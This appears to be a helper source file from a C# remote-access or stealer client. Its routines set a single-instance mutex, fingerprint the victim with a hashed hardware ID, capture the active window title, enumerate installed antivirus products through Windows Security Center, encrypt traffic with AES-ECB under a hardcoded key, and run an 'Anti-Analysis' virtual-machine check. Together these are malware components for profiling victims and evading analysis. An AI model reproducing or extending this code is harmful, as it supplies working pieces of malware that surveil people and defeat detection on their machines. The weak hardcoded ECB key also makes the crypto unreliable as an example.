﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using static Client.Native;
using DISPPARAMS = System.Runtime.InteropServices.ComTypes.DISPPARAMS;
using EXCEPINFO = System.Runtime.InteropServices.ComTypes.EXCEPINFO;

namespace Client.Helper
{
    public static unsafe class Helper
    {
        #region Mutex

        public static Mutex currentApp;

        public static bool CreateMutex()
        {
            currentApp = new Mutex(false, Program.Mutex+Environment.UserName, out var createdNew);
            return createdNew;
        }

        public static void CloseMutex()
        {
            if (currentApp != null)
            {
                currentApp.Close();
                currentApp = null;
            }
        }

        #endregion

        #region CLR

        public static int GetClrVersion()
        {
            var assms = AppDomain.CurrentDomain.GetAssemblies();
            foreach (var assmble in assms)
            {
                var assembleName = assmble.GetName();
                if (assembleName.Name == "mscorlib" && assembleName.Version.Major == 2)
                    return 2;
            }
            return 4;
        }

        #endregion

        #region Active

        public static string GetActiveWindowTitle()
        {
            try
            {
                const int nChars = 256;
                var buff = new StringBuilder(nChars);
                var handle = GetForegroundWindow();
                if (GetWindowText(handle, buff, nChars) > 0) return buff.ToString();
            }
            catch
            {
            }

            return "";
        }

        #endregion

        #region HWID

        public static string GetHWID()
        {
            try
            {
                var strToHash = string.Concat(Environment.ProcessorCount, Environment.UserName,
                    Environment.MachineName, Environment.OSVersion
                    , new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize, Program.Mutex);
                var md5Obj = new MD5CryptoServiceProvider();
                var bytesToHash = Encoding.ASCII.GetBytes(strToHash);
                bytesToHash = md5Obj.ComputeHash(bytesToHash);
                var strResult = new StringBuilder();
                foreach (var b in bytesToHash) strResult.Append(b.ToString("x2"));

                return strResult.ToString().Substring(0, 20).ToUpper();
            }
            catch
            {
                return "Err HWID";
            }
        }

        #endregion

        #region AV

        public static string GetAV()
        {
            try
            {
                var AV = "";
                IWSCProductList pWSCProductList;
                var WSCProductListType = Type.GetTypeFromCLSID(new Guid("17072F7B-9ABE-4A74-A261-1EB76B55107A"), true);
                var WSCProductList = Activator.CreateInstance(WSCProductListType);
                pWSCProductList = (IWSCProductList)WSCProductList;

                if (0 == pWSCProductList.Initialize(0x4))
                {
                    uint nProductCount = 0;
                    if (0 == pWSCProductList.get_Count(out nProductCount))
                        for (uint i = 0; i < nProductCount; i++)
                            if (0 == pWSCProductList.get_Item(i, out var pWscProduct))
                            {
                                var sProductName = new string('\0', 260);

                                if (0 == pWscProduct.get_ProductName(out sProductName))
                                {
                                    if (AV != "") AV += " ; ";
                                    AV += sProductName;
                                }

                                Marshal.ReleaseComObject(pWscProduct);
                            }

                    Marshal.ReleaseComObject(pWSCProductList);
                }

                return AV;
            }
            catch
            {
                return "Unknown";
            }
        }


        [ComImport]
        [Guid("8C38232E-3A45-4A27-92B0-1A16A975F669")]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        public interface IWscProduct
        {
            #region <IDispatch>

            int GetTypeInfoCount();

            [return: MarshalAs(UnmanagedType.Interface)]
            IntPtr GetTypeInfo([In][MarshalAs(UnmanagedType.U4)] int iTInfo,
                [In][MarshalAs(UnmanagedType.U4)] int lcid);

            [PreserveSig]
            int GetIDsOfNames([In] ref Guid riid, [In][MarshalAs(UnmanagedType.LPArray)] string[] rgszNames,
                [In][MarshalAs(UnmanagedType.U4)] int cNames,
                [In][MarshalAs(UnmanagedType.U4)] int lcid, [Out][MarshalAs(UnmanagedType.LPArray)] int[] rgDispId);

            [PreserveSig]
            int Invoke(int dispIdMember, [In] ref Guid riid, [In][MarshalAs(UnmanagedType.U4)] int lcid,
                [In][MarshalAs(UnmanagedType.U4)] int dwFlags,
                [Out][In] DISPPARAMS pDispParams, [Out] out object pVarResult,
                [Out][In] EXCEPINFO pExcepInfo,
                [Out] [MarshalAs(UnmanagedType.LPArray)]
                IntPtr[] pArgErr);

            #endregion

            int get_ProductName(out string pVal);
        }

        [ComImport]
        [Guid("722A338C-6E8E-4E72-AC27-1417FB0C81C2")]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        public interface IWSCProductList
        {
            #region <IDispatch>

            int GetTypeInfoCount();

            [return: MarshalAs(UnmanagedType.Interface)]
            IntPtr GetTypeInfo([In][MarshalAs(UnmanagedType.U4)] int iTInfo,
                [In][MarshalAs(UnmanagedType.U4)] int lcid);

            [PreserveSig]
            int GetIDsOfNames([In] ref Guid riid, [In][MarshalAs(UnmanagedType.LPArray)] string[] rgszNames,
                [In][MarshalAs(UnmanagedType.U4)] int cNames,
                [In][MarshalAs(UnmanagedType.U4)] int lcid, [Out][MarshalAs(UnmanagedType.LPArray)] int[] rgDispId);

            [PreserveSig]
            int Invoke(int dispIdMember, [In] ref Guid riid, [In][MarshalAs(UnmanagedType.U4)] int lcid,
                [In][MarshalAs(UnmanagedType.U4)] int dwFlags,
                [Out][In] DISPPARAMS pDispParams, [Out] out object pVarResult,
                [Out][In] EXCEPINFO pExcepInfo,
                [Out] [MarshalAs(UnmanagedType.LPArray)]
                IntPtr[] pArgErr);

            #endregion

            int Initialize(uint provider);
            int get_Count(out uint pVal);
            int get_Item(uint index, out IWscProduct pVal);
        }

        #endregion

        #region AES
        public class Aes
        {
            private static byte[] keyArray = Encoding.UTF8.GetBytes("Creeper_Awww_Man");

            public static byte[] Encrypt(byte[] toEncryptArray)
            {
                RijndaelManaged rDel = new RijndaelManaged();
                rDel.Key = keyArray;
                rDel.Mode = CipherMode.ECB;
                rDel.Padding = PaddingMode.PKCS7;
                ICryptoTransform cTransform = rDel.CreateEncryptor();
                byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
                return resultArray;
            }

            public static byte[] Decrypt(byte[] toEncryptArray)
            {
                RijndaelManaged rDel = new RijndaelManaged();
                rDel.Key = keyArray;
                rDel.Mode = CipherMode.ECB;
                rDel.Padding = PaddingMode.PKCS7;
                ICryptoTransform cTransform = rDel.CreateDecryptor();
                byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
                return resultArray;
            }
        }

        #endregion

        #region 32/64

        public static bool Is64Bit()
        {
            if (IntPtr.Size == 8)
                return true;

            bool is64Bit;
            if (IsWow64Process(GetCurrentProcess(), out is64Bit))
            {
                return is64Bit;
            }
            else { return false; }
        }

        [DllImport("kernel32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);

        [DllImport("kernel32")]
        public static extern IntPtr GetCurrentProcess();
        #endregion

        #region Anti-Analysis

        public static bool IsVM()
        {
            //true for VM
            return !((from o in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get()
                             .OfType<ManagementObject>()
                      select (uint)o.GetPropertyValue("ProductType")).First() != 1U ||
                     !(new ManagementObjectSearcher("Select * from CIM_Memory").Get().OfType<ManagementObject>()
                         .ToList()
                         .Count < 2));
        }
        #endregion
    }
}